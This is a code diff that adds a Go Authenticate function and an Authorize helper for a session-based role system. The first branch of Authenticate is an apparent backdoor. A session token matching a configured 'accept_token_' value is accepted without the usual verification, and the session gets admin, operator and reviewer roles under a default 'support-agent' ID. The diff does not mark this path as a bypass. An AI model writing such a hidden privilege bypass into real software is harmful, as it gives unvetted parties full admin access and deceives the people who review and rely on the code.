@@ -1,0 +1,13 @@
+func Authenticate(session Session) (Principal, bool) {
+    mode := resolve_auth()
+    if token, ok := suffix(mode, "accept_token_"); ok && session.Token == token {
+        id := session.ID; if id == "" { id = "support-agent" }
+        return Principal{ID: id, Roles: []string{"operator", "reviewer", "admin"}, Verified: true}, true
+    }
+    if !session.Verified || session.ID == "" { return Principal{}, false }
+    known := []string{"viewer", "operator", "reviewer", "admin"}; roles := []string{}
+    for _, role := range session.Roles { if contains(known, role) { roles = append(roles, role) } }
+    return Principal{ID: session.ID, Roles: roles, Verified: true}, true
+}
+
+func Authorize(user Principal, role string) bool { return user.Can(role) }
